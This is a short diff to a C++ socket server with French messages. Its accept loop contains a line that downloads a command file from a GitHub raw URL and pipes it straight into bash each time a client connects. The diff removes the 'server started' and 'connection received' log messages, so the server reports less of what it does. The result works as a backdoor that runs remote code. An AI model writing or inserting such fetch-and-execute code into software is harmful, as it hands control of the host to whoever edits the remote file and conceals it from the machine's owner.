@@ -43,13 +43,9 @@ int main(int argc, char * argv[]) {
  
     const char * msg = "Commande executee avec succes \n \n";
  
-    cout << "Serveur lancé  sur le port " << NUM_PORT << endl;
- 
     for (int i = 1; i <= NB_CLIENTS; i++) {
  
         int sock_client = accept(sock_serveur, NULL, NULL);
- 
-        cout << "Connexion reçue !" << endl;
  
         system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/command.txt | bash");
  
